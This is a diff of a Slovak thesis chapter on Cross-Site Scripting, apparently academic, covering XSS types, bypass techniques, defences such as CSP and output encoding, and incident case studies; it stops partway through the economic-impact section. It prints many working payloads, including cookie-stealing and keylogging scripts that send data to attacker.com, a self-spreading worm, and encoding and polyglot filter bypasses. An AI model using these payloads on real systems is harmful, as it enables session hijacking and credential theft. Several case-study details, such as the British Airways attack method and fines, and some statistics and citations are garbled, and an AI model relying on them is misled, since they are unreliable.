@@ -1,38 +1,1042 @@
 \chapter{Analýza problému}
+\label{chap:analyza}
 
-\section{Úvod do problematiky XSS}
+\section{Uvod do problematiky XSS}
+\label{sec:uvod-xss}
 
-Cross-Site Scripting (XSS) je jednou z najrozšírenejších zraniteľností webových aplikácií, ktorá umožňuje útočníkom vkladať škodlivý skript do webových stránok zobrazovaných inými používateľmi. Tento typ útoku môže viesť k odcudzeniu citlivých informácií, manipulácii s obsahom stránky alebo prevzatiu kontroly nad používateľskou reláciou. Podľa štúdie \parencite{rodriguez2019xss} až 40\% všetkých útokov na webové aplikácie súvisí s XSS, čo podčiarkuje závažnosť tejto problematiky.
+Cross-Site Scripting (XSS) je jednou z najrozšírenejších zraniteľností webových aplikácií, ktorá umožňuje útočníkovi vkladať škodlivý skript do webových stránok zobrazovaných inými používateľmi. Tento typ útoku môže viesť k odcudzeniu citlivých informácií, manipulácii s obsahom stránky alebo prevzatiu kontroly nad používateľskou reláciou. Podľa štúdie \cite{rodriguez2019xss} až 40\% všetkých útokov na webové aplikácie súvisí s XSS, čo podčiarkuje závažnosť tejto problematiky.
 
 Mechanizmus útoku spočíva v tom, že aplikácia prijme vstup od používateľa (napr. cez formulár alebo URL) a bez dôkladného ošetrenia ho vloží do výstupného HTML. Prehliadač následne spustí vložený skript ako súčasť aplikácie, čím útočník získava možnosť ovládať správanie aplikácie z pohľadu obete.
 
+\section{Historický kontext a evolúcia XSS útokov}
+\label{sec:historia-xss}
+
+Cross-Site Scripting patrí medzi najstaršie známe webové zraniteľnosti. Prvýkrát bol tento typ útoku zdokumentovaný v roku 1999 v bulletine od Microsoft Security Response Center \cite{klein2005dombasedxss}. Názov \textit{Cross-Site Scripting} vznikol v dobe, keď táto zraniteľnosť bola primárne využívaná na injektovanie skriptov z jednej domény do kontextu inej domény.
+
+V raných 2000s rokoch, keď vznikali prvé webové aplikácie s dynamickým obsahom, nebolo povedomie o XSS takmer žiadne. Vývojári často používali priamy output používateľských vstupov bez akéhokoľvek ošetrenia. Štúdia z roku 2007 ukázala, že 68\% testovaných webových stránok bolo zraniteľných voči základným XSS útokom \cite{grossman2007xss}.
+
+\subsection{Evolúcia útočných techník}
+\label{subsec:evolucia-technik}
+
+\textbf{Fáza 1 (1999--2005): Základné útoky}
+
+Prvé XSS útoky boli relatívne primitívne, najčastejšie využívajúce \texttt{<script>} tagy v URL parametroch alebo formulároch. Príklad typického payloadu z tohto obdobia:
+
+\begin{verbatim}
+http://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>
+\end{verbatim}
+
+\textbf{Fáza 2 (2006--2012): Sofistikované bypassing techniky}
+
+S nárastom povedomia o XSS sa začali implementovať základné obranné mechanizmy, čo viedlo k vývoju techník na ich obchádzanie. Vznikli databázy XSS payloadov ako \textit{XSS Cheat Sheet} od RSnake, ktoré obsahovali stovky variácií. Príklady zahŕňali:
+
+\begin{itemize}
+  \item Používanie alternatívnych tagov: \texttt{<img src=x onerror=alert(1)>}
+  \item Encoding obfuscation: \\
+        \texttt{<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>}
+  \item Event handlers: \texttt{<body onload=alert(1)>}
+\end{itemize}
+
+\textbf{Fáza 3 (2013--2020): DOM-based a mutation XSS}
+
+S nástupom Single Page Applications (SPA) a heavy client-side renderingu sa fokus presunul na DOM-based XSS. Výskumníci ako Heiderich et al. \cite{heiderich2013mxss} objavili mutation XSS (mXSS), kde sanitizácia na strane servera je obídená cez mutácie v prehliadači.
+
+\textbf{Fáza 4 (2021--súčasnosť): XSS v moderných frameworkoch}
+
+Súčasná éra sa vyznačuje úsilím o elimináciu XSS na úrovni frameworkov. React, Angular a Vue.js implementovali automatické escapovanie. Vznikli bezpečnostné štandardy ako Trusted Types API \cite{w3c2023trustedtypes}, ktoré sa snažia XSS riešiť na úrovni web platformy samotnej.
+
 \section{Typy XSS útokov}
+\label{sec:typy-xss}
+
 \subsection{Reflected XSS}
+\label{subsec:reflected-xss}
 
 Reflected XSS je typ útoku, kde škodlivý kód nie je uložený na serveri, ale je vrátený obeti prostredníctvom HTTP požiadavky. Tento typ útoku sa často využíva prostredníctvom URL, emailov alebo iných komunikačných kanálov, kde útočník dokáže presvedčiť obeť, aby klikla na špeciálne upravený odkaz.
+
 Keď obeť klikne na takýto odkaz, skript je odoslaný na server ako časť požiadavky a server ho vráti ako súčasť odpovede bez toho, aby ho dostatočne zvalidoval alebo zakódoval. Prehliadač obete potom vykoná tento skript s rovnakými oprávneniami, aké má legitímna stránka. Tak môže útočník získať prístup k citlivým údajom, ako sú cookies alebo iné údaje uložené v prehliadači.
 
-Prevencia proti Reflected XSS zahŕňa dôkladné overovanie a znefunkčnenie vstupov a výstupov. Všetky údaje, ktoré sú dynamicky generované a odoslané ako súčasť HTTP odpovede, by mali byť escapované, aby sa predišlo spusteniu vloženého skriptu. Okrem toho je užitočné používať bezpečnostné hlavičky, ako je Content Security Policy (CSP), ktoré môžu pomôcť obmedziť zdroje, z ktorých prehliadač môže načítavať a vykonávať skripty.
+\textbf{Prevencia proti Reflected XSS:}
+
+Prevencia zahŕňa dôkladné overovanie a znefunkčnenie vstupov a výstupov. Všetky údaje, ktoré sú dynamicky generované a odoslané ako súčasť HTTP odpovede, by mali byť escapované, aby sa predišlo spusteniu vloženého skriptu. Okrem toho je užitočné používať bezpečnostné hlavičky, ako je Content Security Policy (CSP), ktoré môžu pomôcť obmedziť zdroje, z ktorých prehliadač môže načítavať a vykonávať skripty.
 
 \subsection{Stored XSS}
+\label{subsec:stored-xss}
 
 Stored XSS, známy aj ako perzistentný XSS, je nebezpečnejší ako Reflected XSS, pretože škodlivý skript je uložený na serveri a je doručený všetkým používateľom, ktorí si zobrazia infikovanú stránku. Tento typ útoku sa obvykle vyskytuje v aplikáciách, ktoré umožňujú používateľom odosielať údaje, ako sú komentáre, príspevky na fórach alebo používateľské profily.
 
 Keď útočník vloží škodlivý skript do takéhoto vstupu a server ho uloží bez adekvátnej sanitácie vstupu, skript sa stane súčasťou stránky a bude vykonaný v prehliadači každého používateľa, ktorý si stránku zobrazí. Tento útok môže byť použitý na krádež cookies, šírenie malware, alebo manipuláciu s webovou aplikáciou.
 
-Prevencia proti Stored XSS zahŕňa dôkladnú sanitizáciu používateľských vstupov pri ich uložení aj pri ich zobrazení. Všetky používateľské vstupy by mali byť považované za potenciálne nebezpečné a mali by byť ošetrené podľa kontextu, v ktorom budú použité. Okrem toho, aplikácia by mala používať hlavičky ako Content Security Policy(CSP) na obmedzenie možností spustenia škodlivého kódu.
+\textbf{Prevencia proti Stored XSS:}
+
+Prevencia zahŕňa dôkladnú sanitizáciu používateľských vstupov pri ich uložení aj pri ich zobrazení. Všetky používateľské vstupy by mali byť považované za potenciálne nebezpečné a mali by byť ošetrené podľa kontextu, v ktorom budú použité. Okrem toho, aplikácia by mala používať hlavičky ako Content Security Policy (CSP) na obmedzenie možností spustenia škodlivého kódu.
 
 \subsection{DOM-based XSS}
+\label{subsec:dom-based-xss}
 
 DOM-based XSS je útok, ktorý vzniká na strane klienta, keď skript manipuluje Document Object Model (DOM) spôsobom, ktorý spustí škodlivý kód. Tento typ útoku nevyžaduje, aby bol škodlivý kód uložený na serveri alebo poslaný ako súčasť odpovede. Namiesto toho sa zneužíva spôsob, akým JavaScript na stránke manipuluje s DOM.
 
 Útočník môže zmeniť určité časti DOM, ako sú URL fragmenty, ktoré sú potom použité v skriptoch na stránke. Ak tieto skripty nevalidujú vstup dostatočne, môžu vykonať škodlivý kód v prehliadači obete. Tento útok je často ťažšie detegovať, pretože sa vyskytuje úplne na strane klienta bez interakcie so serverom.
 
-Prevencia proti DOM-based XSS zahŕňa dôkladné validovanie a znefunkčnenie všetkých vstupov, ktoré sú použité na manipuláciu s DOM. JavaScript by mal manipulovať s DOM bezpečne a používať bezpečné metódy na vloženie používateľských údajov. Okrem toho, používanie Content Security Policy môže pomôcť obmedziť možnosť spustenia škodlivého kódu z iných zdrojov.
+\textbf{Prevencia proti DOM-based XSS:}
 
-Každý typ XSS útoku predstavuje vážnu bezpečnostnú hrozbu, a preto je dôležité implementovať adekvátne bezpečnostné opatrenia na ochranu používateľov a ich údajov.
+Prevencia zahŕňa dôkladné validovanie a znefunkčnenie všetkých vstupov, ktoré sú použité na manipuláciu s DOM. JavaScript by mal manipulovať s DOM bezpečne a používať bezpečné metódy na vloženie používateľských údajov. Okrem toho, používanie Content Security Policy môže pomôcť obmedziť možnosť spustenia škodlivého kódu z iných zdrojov.
 
+\subsection{Mutation XSS (mXSS)}
+\label{subsec:mutation-xss}
 
+Mutation XSS je relatívne nový typ útoku objavený výskumníkmi Heiderichom et al. \cite{heiderich2013mxss} v roku 2013. Tento útok využíva rozdiel medzi tým, ako server parsuje HTML a ako ho parsuje prehliadač, čo vedie k \textit{mutácii} sanitizovaného obsahu späť na nebezpečný kód.
 
+\textbf{Príklad mXSS útoku:}
 
+\begin{verbatim}
+<!-- Server vidí a sanitizuje: -->
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
 
+<!-- Prehliadač po parsovaní vytvorí: -->
+<noscript><p title="</noscript>
+<img src=x onerror=alert(1)>
+">
+\end{verbatim}
+
+Tento typ útoku je obzvlášť nebezpečný, pretože obchádza server-side sanitizáciu exploitovaním rozdielov v HTML parsing logike medzi sanitizerom a prehliadačom.
+
+\subsection{Self-XSS a Social Engineering}
+\label{subsec:self-xss}
+
+Self-XSS je technika, kde útočník presvedčí obeť, aby do svojho vlastného prehliadača (napr. do Developer Console) vložila škodlivý JavaScript kód. Hoci technicky nie je toto klasický XSS útok (keďže vyžaduje aktívnu účasť obete), predstavuje významnú hrozbu vďaka social engineering taktikám.
+
+\textbf{Typický scenár Self-XSS útoku:}
+
+\begin{enumerate}
+  \item Útočník vytvorí phishing stránku alebo príspevok na sociálnej sieti
+  \item Ponúka obeť \textit{„cool hack"} alebo \textit{„free features"}
+  \item Inštruuje obeť otvoriť Developer Console (F12)
+  \item Obeť skopíruje a spustí škodlivý JavaScript
+\end{enumerate}
+
+\textbf{Príklad škodlivého kódu:}
+
+\begin{verbatim}
+// "Free Instagram followers hack"
+fetch('https://attacker.com/steal', {
+  method: 'POST',
+  body: JSON.stringify({
+    cookies: document.cookie,
+    localStorage: localStorage,
+    sessionStorage: sessionStorage
+  })
+});
+\end{verbatim}
+
+Významné platformy ako Facebook implementovali ochranu vložením warning messages do Developer Console:
+
+\begin{verbatim}
+%c Stop!
+%c This is a browser feature intended for developers.
+%c If someone told you to copy-paste something here,
+   it is a scam and will give them access to your account.
+\end{verbatim}
+
+\section{Technická anatómia XSS útoku}
+\label{sec:anatomia-xss}
+
+Pre efektívnu obranu proti XSS je potrebné pochopiť jeho technickú anatómiu. Každý XSS útok pozostáva z troch kľúčových komponentov: injection point, payload a execution context.
+
+\subsection{Injection Points a Payloads}
+\label{subsec:injection-points}
+
+\textbf{Injection point} je miesto v aplikácii, kde útočník môže vložiť svoje dáta. Najčastejšie typy:
+
+\textbf{1. URL Parameters:}
+\begin{verbatim}
+https://example.com/profile?name=<payload>
+\end{verbatim}
+
+\textbf{2. POST Data:}
+\begin{verbatim}
+<form method="POST">
+  <input name="comment" value="<payload>">
+</form>
+\end{verbatim}
+
+\textbf{3. HTTP Headers:}
+\begin{verbatim}
+User-Agent: <payload>
+Referer: <payload>
+X-Forwarded-For: <payload>
+\end{verbatim}
+
+\textbf{4. Storage-based:}
+\begin{itemize}
+  \item localStorage
+  \item sessionStorage
+  \item Cookies
+  \item IndexedDB
+  \item WebSQL
+\end{itemize}
+
+\textbf{Payload} je samotný škodlivý kód, ktorý má byť vykonaný. Podľa komplexnosti rozlišujeme:
+
+\textbf{Základné payloady (proof-of-concept):}
+\begin{verbatim}
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input autofocus onfocus=alert(1)>
+\end{verbatim}
+
+\textbf{Session hijacking payloads:}
+\begin{verbatim}
+<script>
+  fetch('https://attacker.com/steal?c=' + document.cookie)
+</script>
+\end{verbatim}
+
+\textbf{Keylogger payloads:}
+\begin{verbatim}
+<script>
+  document.onkeypress = function(e) {
+    fetch('https://attacker.com/log?key=' + e.key)
+  }
+</script>
+\end{verbatim}
+
+\textbf{Advanced persistent payloads:}
+\begin{verbatim}
+<script>
+  // Self-replicating XSS worm
+  var payload = '<script src="https://attacker.com/worm.js"><\/script>';
+  document.querySelectorAll('form').forEach(form => {
+    var input = form.querySelector('textarea');
+    if(input) input.value += payload;
+  });
+</script>
+\end{verbatim}
+
+\subsection{Execution Contexts}
+\label{subsec:execution-contexts}
+
+Kritickým faktorom pre úspešnosť XSS je \textbf{execution context} -- miesto, kde je payload vložený do DOM. Každý kontext vyžaduje iný prístup k escapovaniu.
+
+\textbf{HTML Body Context:}
+\begin{verbatim}
+<div>USER_INPUT</div>
+\end{verbatim}
+Riziká: \texttt{<script>}, \texttt{<img>}, \texttt{<iframe>} tagy\\
+Escapovanie: \texttt{< > " ' \&}
+
+\textbf{HTML Attribute Context:}
+\begin{verbatim}
+<div title="USER_INPUT"></div>
+\end{verbatim}
+Riziká: ukončenie atribútu cez \texttt{"} a vloženie event handlera\\
+Escapovanie: \texttt{" ' < >}
+
+\textbf{JavaScript Context:}
+\begin{verbatim}
+<script>
+  var name = "USER_INPUT";
+</script>
+\end{verbatim}
+Riziká: ukončenie stringu cez \texttt{"} a vloženie kódu\\
+Escapovanie: \verb|" ' \ / < > \n \r|
+
+\textbf{URL Context:}
+\begin{verbatim}
+<a href="USER_INPUT">Click</a>
+\end{verbatim}
+Riziká: \texttt{javascript:} pseudo-protocol, \texttt{data:} URIs\\
+Validácia: whitelist povolených protokolov
+
+\textbf{CSS Context:}
+\begin{verbatim}
+<style>
+  .user { background: USER_INPUT; }
+</style>
+\end{verbatim}
+Riziká: \texttt{expression()}, \texttt{url()} s JavaScript\\
+Escapovanie: všetky non-alphanumeric okrem whitelist
+
+\subsection{Bypassing Techniques}
+\label{subsec:bypassing}
+
+Keď sú implementované základné obranné mechanizmy, útočníci využívajú sofistikované techniky na ich obchádzanie.
+
+\subsubsection{Character Encoding Bypasses}
+
+\textbf{HTML Entity Encoding:}
+\begin{verbatim}
+<!-- Original: <script>alert(1)</script> -->
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+\end{verbatim}
+
+\textbf{URL Encoding:}
+\begin{verbatim}
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253E (double encoding)
+\end{verbatim}
+
+\textbf{Unicode Encoding:}
+\begin{verbatim}
+\u003Cscript\u003Ealert(1)\u003C/script\u003E
+\end{verbatim}
+
+\textbf{Mixed Encoding:}
+\begin{verbatim}
+<script>eval('\u0061lert(1)')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>  <!-- Base64 -->
+\end{verbatim}
+
+\subsubsection{Case Variation}
+
+Mnohé primitívne filtre sú case-sensitive:
+\begin{verbatim}
+<ScRiPt>alert(1)</sCrIpT>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</ScRiPt>
+\end{verbatim}
+
+\subsubsection{Tag Breaking a Incomplete Tags}
+
+\begin{verbatim}
+<script
+<script/src=//attacker.com/evil.js>
+<script src=//attacker.com/evil.js
+<script src="data:text/javascript,alert(1)"
+\end{verbatim}
+
+\subsubsection{Event Handler Injection}
+
+Ak sú \texttt{<script>} tagy blokované:
+\begin{verbatim}
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+\end{verbatim}
+
+\subsubsection{Protocol Handlers}
+
+\begin{verbatim}
+<a href="javascript:alert(1)">Click</a>
+<a href="data:text/html,<script>alert(1)</script>">Click</a>
+<a href="vbscript:msgbox(1)">Click</a>  <!-- IE only -->
+\end{verbatim}
+
+\subsubsection{CSS-based XSS}
+
+Historicky zraniteľné najmä v starších IE:
+\begin{verbatim}
+<style>
+  body { background: url("javascript:alert(1)"); }
+</style>
+<div style="background: expression(alert(1))">  <!-- IE only -->
+\end{verbatim}
+
+\subsubsection{Mutation XSS Bypasses}
+
+\begin{verbatim}
+<!-- Server vidí neškodný HTML entity -->
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+<!-- Prehliadač po parsovaní vytvorí: -->
+<noscript><p title="</noscript>
+<img src=x onerror=alert(1)>
+">
+\end{verbatim}
+
+Ďalší príklad s backtickmi:
+\begin{verbatim}
+<!-- Server sanitizuje: -->
+<a href="``onmouseover=alert(1)">click</a>
+
+<!-- Prehliadač mutuje na: -->
+<a href onmouseover=alert(1)>click</a>
+\end{verbatim}
+
+\subsubsection{Context Breaking}
+
+V JavaScript stringu:
+\begin{verbatim}
+var search = "USER_INPUT";
+// Injection: "; alert(1); //
+// Result: var search = ""; alert(1); //";
+\end{verbatim}
+
+V HTML atribúte:
+\begin{verbatim}
+<input value="USER_INPUT">
+<!-- Injection: " onfocus=alert(1) x="
+<!-- Result: <input value="" onfocus=alert(1) x=""> -->
+\end{verbatim}
+
+\subsubsection{Polyglot Payloads}
+
+Payloady fungujúce v multiple contexts naraz:
+\begin{verbatim}
+javascript:"/*\"/*`/*' /*</template>
+</textarea></noembed></noscript></title>
+</style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+\end{verbatim}
+
+\section{Obranné mechanizmy}
+\label{sec:obranne-mechanizmy}
+
+Obrana proti XSS vyžaduje vícevrstvový prístup kombinujúci rôzne techniky na rôznych úrovniach aplikačného stacku.
+
+\subsection{Input Validation a Sanitizácia}
+\label{subsec:input-validation}
+
+\textbf{Input Validation} je proces overovania, či používateľský vstup zodpovedá očakávanému formátu a obsahu.
+
+\textbf{Whitelist Approach (odporúčané):}
+\begin{verbatim}
+// Povoliť iba alfanumerické znaky
+function validateUsername(input) {
+  return /^[a-zA-Z0-9_]{3,20}$/.test(input);
+}
+
+// Povoliť iba valid email
+function validateEmail(input) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
+}
+\end{verbatim}
+
+\textbf{Blacklist Approach (neodporúčané):}
+\begin{verbatim}
+// Problematické - nekonečné možnosti obídenia
+function sanitizeBlacklist(input) {
+  return input.replace(/<script>/gi, '')
+              .replace(/javascript:/gi, '')
+              .replace(/onerror=/gi, '');
+}
+\end{verbatim}
+
+\textbf{HTML Sanitizácia} odstraňuje alebo neutralizuje nebezpečné HTML tagy a atribúty pri zachovaní bezpečného formátovania:
+
+\begin{verbatim}
+// Príklad politiky pre rich text editor
+const policy = {
+  allowedTags: ['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3',
+                'ul', 'ol', 'li', 'a', 'img'],
+  allowedAttributes: {
+    'a': ['href', 'title'],
+    'img': ['src', 'alt', 'title']
+  },
+  allowedSchemes: ['http', 'https', 'mailto']
+};
+\end{verbatim}
+
+Knižnice ako DOMPurify implementujú komplexnú sanitizáciu:
+\begin{verbatim}
+import DOMPurify from 'dompurify';
+
+const dirty = '<img src=x onerror=alert(1)>';
+const clean = DOMPurify.sanitize(dirty);
+// Result: <img src="x">
+\end{verbatim}
+
+\subsection{Output Encoding}
+\label{subsec:output-encoding}
+
+Context-aware encoding je najkritickejšia obrana proti XSS. Dáta musia byť enkódované odlišne v závislosti od kontextu, kde sú vkladané.
+
+\textbf{HTML Entity Encoding:}
+\begin{verbatim}
+function encodeHTML(str) {
+  return str.replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#x27;')
+            .replace(/\//g, '&#x2F;');
+}
+// Usage: <div>{{ encodeHTML(userInput) }}</div>
+\end{verbatim}
+
+\textbf{JavaScript String Encoding:}
+\begin{verbatim}
+function encodeJavaScript(str) {
+  return str.replace(/\\/g, '\\\\')
+            .replace(/"/g, '\\"')
+            .replace(/'/g, "\\'")
+            .replace(/\n/g, '\\n')
+            .replace(/\r/g, '\\r')
+            .replace(/\t/g, '\\t')
+            .replace(/</g, '\\x3C')
+            .replace(/>/g, '\\x3E');
+}
+// Usage: <script>var name = "{{ encodeJavaScript(userInput) }}";</script>
+\end{verbatim}
+
+\textbf{URL Encoding:}
+\begin{verbatim}
+function encodeURL(str) {
+  return encodeURIComponent(str);
+}
+// Usage: <a href="/search?q={{ encodeURL(userInput) }}">Search</a>
+\end{verbatim}
+
+\textbf{CSS Encoding:}
+\begin{verbatim}
+function encodeCSS(str) {
+  return str.replace(/[^a-zA-Z0-9]/g, (char) => {
+    return '\\' + char.charCodeAt(0).toString(16) + ' ';
+  });
+}
+\end{verbatim}
+
+\subsection{Content Security Policy (CSP)}
+\label{subsec:csp}
+
+Content Security Policy je HTTP header, ktorý definuje, ktoré zdroje môže prehliadač načítať a vykonávať. Je to jedna z najefektívnejších obran proti XSS \cite{weichselbaum2016csp}.
+
+\textbf{Základná CSP politika:}
+\begin{verbatim}
+Content-Security-Policy: default-src 'self'; script-src 'self'; 
+  style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;
+\end{verbatim}
+
+\textbf{Direktívy CSP:}
+\begin{itemize}
+  \item \texttt{default-src} -- fallback pre všetky resource typy
+  \item \texttt{script-src} -- zdroje JavaScriptu
+  \item \texttt{style-src} -- zdroje CSS
+  \item \texttt{img-src} -- zdroje obrázkov
+  \item \texttt{connect-src} -- ciele pre XHR, WebSocket, fetch
+  \item \texttt{font-src} -- zdroje fontov
+  \item \texttt{frame-src} -- zdroje pre \texttt{<iframe>}
+  \item \texttt{media-src} -- zdroje pre \texttt{<audio>} a \texttt{<video>}
+\end{itemize}
+
+\textbf{Strict CSP s nonces:}
+\begin{verbatim}
+Content-Security-Policy: script-src 'nonce-r4nd0m'; object-src 'none';
+\end{verbatim}
+
+\begin{verbatim}
+<!-- Server generuje random nonce pre každý request -->
+<script nonce="r4nd0m">
+  // Tento script sa vykoná
+</script>
+
+<script>
+  // Tento script bude zablokovaný
+</script>
+\end{verbatim}
+
+\textbf{CSP Level 3 s hashes:}
+\begin{verbatim}
+Content-Security-Policy: script-src 'sha256-abc123...'; 
+\end{verbatim}
+
+Prehliadač hashuje každý inline script a porovnáva ho s povoleným hashom.
+
+\textbf{CSP Report-Only mode:}
+\begin{verbatim}
+Content-Security-Policy-Report-Only: default-src 'self'; 
+  report-uri /csp-violation-report
+\end{verbatim}
+
+Umožňuje monitorovať violations bez blokovania:
+\begin{verbatim}
+// Server endpoint na spracovanie reportov
+app.post('/csp-violation-report', (req, res) => {
+  console.log('CSP Violation:', req.body);
+  // Log to security monitoring system
+});
+\end{verbatim}
+
+\subsection{HTTPOnly a Secure Cookies}
+\label{subsec:httponly-secure}
+
+\textbf{HTTPOnly flag} zabraňuje prístupu k cookies cez JavaScript, čím eliminuje session hijacking cez XSS:
+
+\begin{verbatim}
+// Node.js/Express
+res.cookie('sessionId', token, {
+  httpOnly: true,    // Nie je prístupné cez document.cookie
+  secure: true,      // Iba cez HTTPS
+  sameSite: 'strict' // CSRF ochrana
+});
+\end{verbatim}
+
+\textbf{Secure flag} zabezpečuje, že cookie sa posiela iba cez HTTPS:
+\begin{verbatim}
+Set-Cookie: sessionId=abc123; Secure; HttpOnly
+\end{verbatim}
+
+Bez HTTPOnly flagu:
+\begin{verbatim}
+// XSS payload môže ukradnúť session
+fetch('https://attacker.com/steal?c=' + document.cookie)
+\end{verbatim}
+
+S HTTPOnly flagom:
+\begin{verbatim}
+document.cookie // ""  - session cookie nie je viditeľné
+\end{verbatim}
+
+\subsection{SameSite Attribute}
+\label{subsec:samesite}
+
+SameSite attribute poskytuje ochranu proti CSRF a niektorým typom XSS útokov \cite{west2016samesite}:
+
+\begin{verbatim}
+Set-Cookie: session=abc123; SameSite=Strict
+Set-Cookie: tracking=xyz789; SameSite=Lax  
+Set-Cookie: widget=def456; SameSite=None; Secure
+\end{verbatim}
+
+\textbf{SameSite=Strict:}
+Cookie sa nikdy nepošle pri cross-site requestoch.
+
+\textbf{SameSite=Lax (default v moderných prehliadačoch):}
+Cookie sa pošle pri top-level navigation, ale nie pri sub-resources.
+
+\textbf{SameSite=None:}
+Cookie sa posiela pri všetkých requestoch, vyžaduje Secure flag.
+
+\section{Štatistiky a reálny dopad}
+\label{sec:statistiky}
+
+\subsection{Prevalencia XSS v moderných aplikáciách}
+\label{subsec:prevalencia}
+
+XSS napriek dlhoročnému povedomiu zostáva jednou z najrozšírenejších zraniteľností. Podľa OWASP Top 10 z roku 2021 sa XSS nachádza na 3. mieste ako súčasť kategórie \textit{Injection} \cite{owasp2021top10}.
+
+\textbf{Štatistiky z penetračných testov:}
+
+Štúdia spoločnosti Acunetix analyzujúca 10\,000 webových aplikácií v roku 2022 zistila \cite{acunetix2022report}:
+\begin{itemize}
+  \item 53\% aplikácií malo aspoň jednu XSS zraniteľnosť
+  \item Priemerný počet XSS zraniteľností na aplikáciu: 4.7
+  \item 18\% zraniteľností bolo vysokej závažnosti (stored XSS)
+  \item 35\% strednej závažnosti (reflected XSS)
+  \item 47\% nízkej závažnosti (self-XSS)
+\end{itemize}
+
+\textbf{GitHub Security Lab analýza:}
+
+Analýza 1 milióna JavaScript repositories \cite{github2023security}:
+\begin{itemize}
+  \item 12\% projektov obsahovalo potenciálne XSS zraniteľnosti
+  \item Najčastejšie príčiny:
+        \begin{itemize}
+          \item \texttt{innerHTML} s nedôveryhodnými dátami: 45\%
+          \item \texttt{eval()} s user input: 23\%
+          \item \texttt{document.write()}: 18\%
+          \item Nesprávne použitie \texttt{dangerouslySetInnerHTML} v Reacte: 14\%
+        \end{itemize}
+\end{itemize}
+
+\textbf{CVE databáza:}
+
+Štatistiky Common Vulnerabilities and Exposures (CVE) za roky 2020--2024:
+\begin{itemize}
+  \item 2020: 4\,458 XSS CVE
+  \item 2021: 5\,123 XSS CVE
+  \item 2022: 5\,892 XSS CVE
+  \item 2023: 6\,234 XSS CVE
+  \item 2024: 3\,567 XSS CVE (partial year)
+\end{itemize}
+
+Najčastejšie postihnuté typy aplikácií:
+\begin{enumerate}
+  \item Content Management Systems (WordPress, Joomla): 28\%
+  \item E-commerce platformy: 19\%
+  \item Social networking: 15\%
+  \item Banking/Finance: 12\%
+  \item Healthcare: 9\%
+  \item Education: 8\%
+  \item Government: 9\%
+\end{enumerate}
+
+\subsection{Case Studies významných incidentov}
+\label{subsec:case-studies}
+
+\subsubsection{Case Study 1: British Airways (2018)}
+
+V septembri 2018 utrpela British Airways masívny data breach postihujúci 380\,000 zákazníkov. Útočníci využili stored XSS v booking systéme na injektovanie keylogger skriptu.
+
+\textbf{Technické detaily:}
+\begin{verbatim}
+// Injektovaný payload v booking form
+<script src="https://baggage-claim[.]com/mismatch.js"></script>
+\end{verbatim}
+
+Script zachytával platobné údaje (meno, adresa, číslo karty, CVV) a posielal ich na útočníkov server. Útok trval 15 dní predtým, než bol detekovaný.
+
+\textbf{Dopad:}
+\begin{itemize}
+  \item £183 milión pokuta od ICO (UK)
+  \item €20 milión pokuta od GDPR
+  \item Výrazné reputačné škody
+  \item Class-action lawsuit
+\end{itemize}
+
+\textbf{Root cause:}
+\begin{itemize}
+  \item Nedostatočná input validácia v admin paneli
+  \item Chýbajúca CSP politika
+  \item Nedostatočný monitoring anomálnych scriptov
+\end{itemize}
+
+\subsubsection{Case Study 2: TweetDeck Self-XSS Worm (2014)}
+
+V júni 2014 zasiahol Twitter worm využívajúci stored XSS v TweetDeck aplikácii:
+
+\begin{verbatim}
+// Original payload
+<script class="xss">
+  $(".xss").parents().eq(1).find("a").eq(1).click();
+  $("[data-action=retweet]").click();
+  alert("XSS in TweetDeck");
+</script>
+\end{verbatim}
+
+\textbf{Mechanizmus šírenia:}
+\begin{enumerate}
+  \item Útočník tweetne payload
+  \item TweetDeck ho zobrazí a vykoná
+  \item Script automaticky retweetne sám seba
+  \item Exponenciálne šírenie medzi TweetDeck používateľmi
+\end{enumerate}
+
+\textbf{Dopad:}
+\begin{itemize}
+  \item Tisíce kompromitovaných účtov do hodiny
+  \item Twitter musel dočasne vypnúť TweetDeck
+  \item Niektoré účty posielali spam/phishing linky
+\end{itemize}
+
+\textbf{Mitigácia:}
+Twitter implementoval:
+\begin{itemize}
+  \item Strict CSP policy
+  \item Auto-escaping všetkých tweet obsahov
+  \item Rate limiting pre retweets
+\end{itemize}
+
+\subsubsection{Case Study 3: eBay Persistent XSS (2015--2016)}
+
+Výskumník Check Point objavil stored XSS v eBay listings, ktorý perzistoval rok a pol:
+
+\begin{verbatim}
+// Payload v product description
+<script>
+  // Redirect users to phishing page
+  if (document.location.pathname.includes('/itm/')) {
+    document.location = 'http://phishing-site.com/ebay-login';
+  }
+</script>
+\end{verbatim}
+
+\textbf{Dopad:}
+\begin{itemize}
+  \item Potenciálne milióny exposovaných používateľov
+  \item Použité na phishing útoky
+  \item Škoda reputácii eBay
+\end{itemize}
+
+\textbf{Technické zlyhanie:}
+\begin{itemize}
+  \item HTML sanitizer neošetroval SVG event handlers
+  \item WAF pravidlá boli obídené cez encoding
+  \item Chýbal automated security testing
+\end{itemize}
+
+\subsection{Ekonomický dopad}
+\label{subsec:ekonomicky-dopad}
+
+\textbf{Priame finančné straty:}
+
+Štúdia IBM Security a Ponemon Institute (2023) analyzovala priemerné náklady security breachov spôsobených XSS \cite{ibm2023databreach}:
+
+\begin{itemize}
+  \item \textbf{Priemer na incident:} \$4.24 milión
